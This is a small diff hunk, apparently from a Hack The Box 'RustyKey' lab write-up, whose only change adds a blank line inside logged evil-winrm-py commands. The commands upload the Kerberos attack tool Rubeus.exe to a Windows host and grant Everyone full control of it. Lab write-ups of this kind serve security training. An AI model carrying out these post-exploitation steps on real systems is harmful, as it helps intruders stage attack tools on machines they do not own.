@@ -600,6 +600,7 @@ https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/Rub
 evil-winrm-py PS C:\Temp> upload Rubeus.exe .
 Uploading /home/kali/htb/RustyKey/Rubeus.exe: 512kB [00:00, 536kB/s]                                         
 [+] File uploaded successfully as: C:\Temp\Rubeus.exe
+
 evil-winrm-py PS C:\Temp> icacls "Rubeus.exe" /grant Everyone:F
 processed file: Rubeus.exe
 Successfully processed 1 files; Failed processing 0 files
